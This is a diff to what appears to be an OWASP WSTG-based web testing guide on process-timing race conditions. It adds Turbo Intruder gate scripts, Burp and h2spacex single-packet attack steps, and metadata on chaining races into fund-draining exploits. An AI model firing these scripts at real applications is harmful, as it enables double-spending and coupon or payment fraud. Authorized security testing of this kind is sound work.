@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [business-logic, workflow, abuse, wstg, busl]
 tech_stack: []
 cwe_ids: [CWE-840]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-busl-01, wstg-busl-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-busl-01: "A race condition (double-spend/TOCTOU) combined with accepted out-of-bounds values (unlimited amount, negative quantity) lets an attacker fire parallel requests each carrying a maximally damaging value — multiplying the financial loss per exploited race window (Critical)"
+  wstg-busl-02: "A race condition combined with replayable/forgeable request tokens lets an attacker capture a single valid transaction and fire it in parallel dozens of times without fresh authorization for each — turns a timing bug into a scriptable, mass fund-draining exploit (Critical)"
 ---
 
 # wstg-busl-04
@@ -359,6 +361,8 @@ asyncio.run(vote_race_condition_test(
 | **Turbo Intruder**  | Burp extension | Race condition testing     |
 | **Race The Web**    | CLI tool       | `race-the-web config.toml` |
 | **asyncio/aiohttp** | Python async   | Parallel requests          |
+| **Raceocat**        | GUI tool       | [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) — ease-of-use race condition exploitation |
+| **h2spacex**         | HTTP/2 lib     | [nxenon/h2spacex](https://github.com/nxenon/h2spacex) — HTTP/2 single-packet attack library |
 
 ### Timing Analysis
 
@@ -371,6 +375,86 @@ asyncio.run(vote_race_condition_test(
 ---
 
 ## Example Commands/Payloads
+
+### HTTP/1.1 Last-Byte Synchronization (Gate Technique)
+
+Send every request except its last byte, hold all connections open, then release the final byte for every request at once so they all land on the server within the same instant. Turbo Intruder implements this natively with the `gate` parameter — queue requests to the same gate, then open it once all connections are established:
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=30,
+                            requestsPerConnection=30,
+                            pipeline=False)
+
+    # Queue N identical requests to the same gate
+    for i in range(30):
+        engine.queue(target.req, target.baseInput, gate='race1')
+
+    engine.start(timeout=5)
+    # Release all queued requests simultaneously
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+Two-step race (e.g. add-to-cart then checkout, or set-password then confirm) — queue the setup request first, then flood the follow-up request through the same gate so it fires immediately after:
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=30,
+                            requestsPerConnection=100,
+                            pipeline=False)
+
+    request1 = '''POST /target-URI-1 HTTP/1.1
+Host: {target}
+Cookie: session=<SESSION>
+
+parameterName=parameterValue'''
+
+    request2 = '''GET /target-URI-2 HTTP/1.1
+Host: {target}
+Cookie: session=<SESSION>
+
+'''
+
+    engine.queue(request1, gate='race1')
+    for i in range(30):
+        engine.queue(request2, gate='race1')
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+### HTTP/2 Single-Packet Attack
+
+HTTP/2 allows multiple requests to be multiplexed over a single TCP connection. By sending ~20-30 requests within a single TCP packet, network jitter that normally desynchronizes "simultaneous" requests is eliminated, producing a much tighter race window than HTTP/1.1 parallel connections.
+
+Manual method in Burp Suite:
+
+```
+1. Send the target request to Repeater
+2. Duplicate the request 20+ times (Ctrl+R)
+3. Select all duplicated tabs, right-click -> "Add to group" (create new group)
+4. Right-click the group -> "Send group in parallel" -> select "single-packet attack"
+```
+
+Scripted method with h2spacex (HTTP/2 single-packet attack library):
+
+```python
+# pip install h2spacex
+from h2spacex import HTTP2SinglePacketAttack, RawHTTP2Connection
+
+conn = RawHTTP2Connection.new_connection("{target}", 443)
+attack = HTTP2SinglePacketAttack(conn)
+attack.add_request(method="POST", path="/api/redeem", headers={"cookie": "session=<SESSION>"}, body="code=DISCOUNT50")
+attack.send(concurrency=25)  # all requests arrive in a single TCP packet
+```
 
 ### Turbo Intruder Script
 
@@ -697,6 +781,7 @@ def process_payment_idempotent(idempotency_key, payment_data):
 - [OWASP WSTG - Test for Process Timing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing)
 - [PortSwigger - Race Conditions](https://portswigger.net/web-security/race-conditions)
 - [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
+- [PayloadsAllTheThings - Race Condition](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition)
 
 
 ---
